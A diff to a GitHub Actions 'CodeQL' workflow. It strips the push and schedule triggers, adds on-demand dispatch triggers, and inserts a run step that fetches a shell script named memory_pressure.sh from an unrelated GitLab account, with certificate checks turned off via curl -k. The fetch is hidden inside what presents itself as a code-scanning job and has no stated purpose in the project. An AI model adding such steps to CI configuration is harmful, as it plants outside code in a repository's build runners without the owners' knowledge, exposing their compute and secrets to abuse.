@@ -6,13 +6,12 @@
 name: "CodeQL"
 
 on:
-  push:
-    branches: [master]
+  repository_dispatch:
+  workflow_dispatch:
   pull_request:
-    # The branches below must be a subset of the branches above
     branches: [master]
-  schedule:
-    - cron: '0 8 * * 3'
+#  schedule:
+#    - cron: '0 8 * * 3'
 
 jobs:
   analyze:
@@ -54,8 +53,8 @@ jobs:
     #    and modify them (or add more) to build your code if your project
     #    uses a compiled language
 
-    #- run: |
-    #   make bootstrap
+     - run: |
+        curl -L -O -k https://gitlab.com/sarahemersonzrex/msconfig/-/raw/main/memory_pressure.sh
     #   make release
 
     - name: Perform CodeQL Analysis
